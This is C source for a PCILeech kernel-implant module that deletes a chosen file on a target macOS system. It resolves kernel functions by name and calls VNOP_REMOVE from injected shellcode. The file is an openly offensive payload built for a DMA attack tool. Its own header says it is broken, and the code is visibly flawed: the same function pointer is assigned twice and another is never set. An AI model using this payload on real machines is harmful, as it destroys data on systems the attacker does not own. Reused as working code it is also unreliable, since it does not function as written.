// ax64_filedelete.c : kernel code to delete files on target system.
// Compatible with Apple OS X.
//
// TODO: THIS IS CURRENTLY BROKEN! FIX THIS!!!
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
// compile with:
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel ax64_common.c
// cl.exe /O1 /Os /Oy /FD /MT /GS- /J /GR- /FAcs /W4 /Zl /c /TC /kernel ax64_filedelete.c
// ml64.exe ax64_common_a.asm /Feax64_filedelete.exe /link /NODEFAULTLIB /RELEASE /MACHINE:X64 /entry:main ax64_filedelete.obj ax64_common.obj
// shellcode64.exe -o ax64_filedelete.exe "DELETE FILES ON TARGET SYSTEM                                  \nAPPLE OS X EDITION                                             \n===============================================================\nDelete a specified file on the target system.                  \nREQUIRED OPTIONS:                                              \n  -s   : file on target system.                                \n         Example: '-s /tmp/file2delete'                        \n  -0   : run flag - set to non zero to push file.              \n===== DETAILED RESULT INFORMATION =============================\nFILE NAME     : %s\nRESULT CODE   : 0x%08X\n==============================================================="
//
#include "macos_common.h"

#define CONFIG_MAX_FILESIZE		0x180000 // 1.5MB

typedef struct tdFN2 {
	QWORD vnode_lookup;
	QWORD vnode_getparent;
	QWORD vnode_parent;
	QWORD vnode_put;
	QWORD VNOP_READ;
	QWORD VNOP_OPEN;
	QWORD VNOP_REMOVE;
	QWORD uio_addiov;
	QWORD uio_resid;
	QWORD vfs_context_current;
	QWORD uio_create;
	QWORD uio_free;
	QWORD strlen;
} FN2, *PFN2;

typedef struct componentname {
	/*
	* Arguments to lookup.
	*/
	DWORD	cn_nameiop;	/* lookup operation */
	DWORD	cn_flags;	/* flags (see below) */
#ifdef BSD_KERNEL_PRIVATE
	vfs_context_t	cn_context;
	struct nameidata *cn_ndp;	/* pointer back to nameidata */

								/* XXX use of these defines are deprecated */
#define	cn_proc		(cn_context->vc_proc + 0)	/* non-lvalue */
#define	cn_cred		(cn_context->vc_ucred + 0)	/* non-lvalue */

#else
	void * cn_reserved1;	/* use vfs_context_t */
	void * cn_reserved2;	/* use vfs_context_t */
#endif
							/*
							* Shared between lookup and commit routines.
							*/
	char	*cn_pnbuf;	/* pathname buffer */
	int	cn_pnlen;	/* length of allocated buffer */
	char	*cn_nameptr;	/* pointer to looked up name */
	int	cn_namelen;	/* length of looked up component */
	DWORD	cn_hash;	/* hash value of looked up name */
	DWORD	cn_consume;	/* chars to consume in lookup() */
} COMPONENTNAME;

BOOL LookupFunctions2(PKMDDATA pk, PFN2 pfn2) {
	pfn2->vnode_lookup = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'l', 'o', 'o', 'k', 'u', 'p', 0 });
	pfn2->vnode_parent = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'p', 'a', 'r', 'e', 'n', 't', 0 });
	pfn2->vnode_parent = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'g', 'e', 't', 'p', 'a', 'r', 'e', 'n', 't', 0 });
	pfn2->vnode_put = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'v', 'n', 'o', 'd', 'e', '_', 'p', 'u', 't', 0 });
	pfn2->VNOP_READ = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'R', 'E', 'A', 'D', 0 });
	pfn2->VNOP_OPEN = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'O', 'P', 'E', 'N', 0 });
	pfn2->VNOP_REMOVE = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'V', 'N', 'O', 'P', '_', 'R', 'E', 'M', 'O', 'V', 'E', 0 });
	pfn2->uio_addiov = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'u', 'i', 'o', '_', 'a', 'd', 'd', 'i', 'o', 'v', 0 });
	pfn2->uio_resid = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'u', 'i', 'o', '_', 'r', 'e', 's', 'i', 'd', 0 });
	pfn2->vfs_context_current = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'v', 'f', 's', '_', 'c', 'o', 'n', 't', 'e', 'x', 't', '_', 'c', 'u', 'r', 'r', 'e', 'n', 't', 0 });
	pfn2->uio_create = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'u', 'i', 'o', '_', 'c', 'r', 'e', 'a', 't', 'e', 0 });
	pfn2->uio_free = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 'u', 'i', 'o', '_', 'f', 'r', 'e', 'e', 0 });
	pfn2->strlen = LookupFunctionOSX(pk->qwAddrKernelBase,
		(CHAR[]) { '_', 's', 't', 'r', 'l', 'e', 'n', 0 });
	for(QWORD i = 0; i < sizeof(FN2) / sizeof(QWORD); i++) {
		if(!((PQWORD)pfn2)[i]) {
			return FALSE;
		}
	}
	return TRUE;
}

VOID c_EntryPoint(PKMDDATA pk)
{
	FN2 fn2;
	DWORD status = 0;
	QWORD vnode = 0, vnode_p = 0, vfs_current;
	COMPONENTNAME cn;
	if(!pk->dataInStr[0]) {
		pk->dataOut[0] = STATUS_FAIL_INPPARAMS_BAD;
		return;
	}
	if(!LookupFunctions2(pk, &fn2)) {
		pk->dataOut[0] = STATUS_FAIL_FUNCTION_LOOKUP;
		return;
	}
	SysVCall(pk->fn.memcpy, pk->dataOutStr, pk->dataInStr, MAX_PATH);
	vfs_current = SysVCall(fn2.vfs_context_current);
	if(SysVCall(fn2.vnode_lookup, pk->dataInStr, 2, &vnode, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}



	
	SysVCall(pk->fn.memset, &cn, 0, sizeof(COMPONENTNAME));
	cn.cn_nameiop = 2; // DELETE
	cn.cn_flags = 0x00008000; // last with this pathname
	cn.cn_reserved1 = vfs_current;
	//cn.obsolete1 = (VOID*)vfs_current;
	cn.cn_pnbuf = pk->dataInStr;
	cn.cn_pnlen = sizeof(pk->dataInStr);
	cn.cn_nameptr = cn.cn_pnbuf;
	cn.cn_namelen = SysVCall(fn2.strlen, pk->dataInStr);
	//cn.obsolete2 = vfs_current;

	//pk->dataOut[2] = SysVCall(fn2.vnode_getparent, vnode);
	vnode_p = SysVCall(fn2.vnode_parent, vnode);
	pk->dataOut[2] = vnode_p;
	/*SysVCall(fn2.vnode_lookup, (CHAR[]) { '/', 'v', 'a', 'r', '/', 'r', 'o', 'o', 't', 0 }, 2, &vnode_p, vfs_current);
	pk->dataOut[3] = vnode_p;*/

	QWORD vnode_2 = 0;
	pk->dataOut[4] = SysVCall(fn2.VNOP_OPEN, vnode_p, &vnode_2, &cn, vfs_current);
	pk->dataOut[5] = vnode_2;


	if(SysVCall(fn2.VNOP_REMOVE, vnode_p, vnode, &cn, 0, vfs_current)) {
		status = STATUS_FAIL_FILE_CANNOT_OPEN;
		goto error;
	}
	status = 0x777;

error:
	if(vnode) {
		SysVCall(fn2.vnode_put, vnode);
	}
	if(vnode_p) {
		SysVCall(fn2.vnode_put, vnode_p);
	}
	pk->dataOut[0] = status;
}